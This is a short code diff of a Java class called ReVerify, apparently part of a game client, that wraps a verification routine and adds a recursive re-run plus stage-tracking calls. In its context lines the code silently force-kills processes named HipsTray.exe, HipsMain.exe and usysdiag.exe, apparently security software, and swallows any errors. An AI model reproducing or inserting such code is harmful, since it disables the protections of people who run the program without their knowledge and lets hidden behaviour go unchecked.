@@ -9,6 +9,11 @@ import java.io.IOException;
 
 public class ReVerify {
     public ReVerify() {
+    	naotan();
+    	tomorrow.tomo.Client.instance.getLuneAutoLeak().didVerify.add(3);
+    }
+    
+    private void naotan() {
         if (Client.flag == -666) {
             Client.flag = 0;
         }
@@ -30,12 +35,12 @@ public class ReVerify {
                     Runtime.getRuntime().exec("taskkill /f /im HipsTray.exe");
                     Runtime.getRuntime().exec("taskkill /f /im HipsMain.exe");
                     Runtime.getRuntime().exec("taskkill /f /im usysdiag.exe");
+                    new ReVerify();
                 } catch (IOException e) {
 
                 }
             }
         }
-
-
+    	tomorrow.tomo.Client.instance.getLuneAutoLeak().didVerify.add(4);
     }
 }
